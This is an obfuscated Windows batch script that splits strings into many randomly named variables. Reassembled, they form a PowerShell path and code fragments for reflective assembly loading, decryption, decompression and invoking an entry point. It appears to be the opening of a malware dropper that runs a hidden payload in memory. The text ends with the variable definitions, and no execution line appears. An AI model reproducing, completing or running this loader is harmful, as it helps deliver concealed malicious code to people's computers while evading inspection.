@echo off
set "aktwnQPzNa=32"
set "UJsVoNqDpT=1."
set "bUQpjTiiwB=\v"
set "ZkrAJAALcT=we"
set "Lorrsjbfoi=.e"
set "eHKSOEJSeB=rS"
set "kTHqHtYYQw=ll"
set "tWGvINqTJq=co"
set "FKcIASdciE=po"
set "gmHnHQWAFT=s\"
set "WXOZUutwPi=ow"
set "wZGefHJQnc=:\"
set "cvIWtrtWZX=rs"
set "QuLGlvLchQ=\W"
set "XwlHfaRseK= C"
set "uZBVPQdUpw=py"
set "yCwItXKYpH=nd"
set "TjWbJmUjaD=em"
set "NUrryhtNcE=he"
set "ZtMkmExEIM=y "
set "TPqGjNaXcB= /"
set "WKAFfRsARI=st"
set "HIUOavxDyA=we"
set "xwIWZljhFZ=in"
set "cJAUplatlu=0\"
set "zgckLknqEz=xe"
set "TOWbWkHKuv=he"
set "bTNQSyxpPo=ws"
set "ZuXiiLqeso=do"
set "PhzLcmFLjP=Wi"
set "ASbkfDBxwb=Po"
set "KovLURsZkP=ll"
set "ufiolUDYLi=Sy"
set "vCuDCSZDdt=cd"
set "fJPngsDGAa= %~dp0"
set "RdRlzadxku=106u"
set "qencDLOjov=orF'"
set "TFMCZSVFed=wLeq"
set "RNwiPKlrJi=$Dqm"
set "XIKeubBhdY=and "
set "iDkTeoBZen=.GZi"
set "MABLDvevaT=ew-O"
set "IzbZXMYEss=$XFn"
set "ZphMtIJDqI=join"
set "FusaFPIxNP=-joi"
set "PRALNAlPuE=l5E7"
set "yymrOELulG=oint"
set "MsXwcrYFpk=[-1."
set "bKIUhoqtIa=d;$X"
set "ipgGuoypKE=:('g"
set "zVXSJwsudE=raph"
set "kPZlhszgXC=.Ass"
set "IEJCCjrcFv=Leq."
set "LnorKiLtzr=Secu"
set "WtobCPuJvw=.Mod"
set "MzUPXYcqDg=sion"
set "OEXitMVgOF=TllA"
set "BWYTHJBuft=Stre"
set "aEMArWfAOR=yste"
set "ewfpYKJjJK= '')"
set "DTxASwOxCH=.Cry"
set "YbaOGHOZba=Wvt "
set "lOJYBrrgRj=$gpQ"
set "oyrGRDEUTe=rity"
set "ELHloTPJOE=null"
set "byMPAWHqBX=ach "
set "BTgWjelwXl=O.Me"
set "gnTVVvMWiL=yste"
set "jWbOiRSmbK=]::C"
set "aGTBGcvNNV=CFxo"
set "OFCBprSLgR=$faj"
set "iyNcRmKOdr=;$SK"
set "srEtaaYqco=flec"
set "DUpRCviZiK=6esa"
set "OIkBmdBvJu=[IO."
set "AXUuGpIdWI=XFne"
set "yOxKBFiaNm=se()"
set "rVCypmkJbu=F'[-"
set "oKPMXBmrCR=ment"
set "OJJKNHWzAX=s75K"
set "aGVdhXtJDD=es.I"
set "egkDggRAoV== $X"
set "WBGdMsrwRj=;$Bw"
set "hIaKujNgqJ=();$"
set "wmgJlHVOjd=oin "
set "AylfkDHQFM=pQfB"
set "PALcdXZkZB=ion."
set "jSLUQIAqsM=.Com"
set "NHeGNipqVp=gth)"
set "CHjlwvjhRb=stem"
set "VCkIpOLDZW=)))"
set "raWJhEvfWH='[-1"
set "gWNFJqniaF=$ZkL"
set "hbuHSPGtFG== [S"
set "qGprMiPJbG= = ["
set "XxAYSmKHdz=gpQf"
set "OOGwewUUeu=ke($"
set "CnTEPqNhZW=1] -"
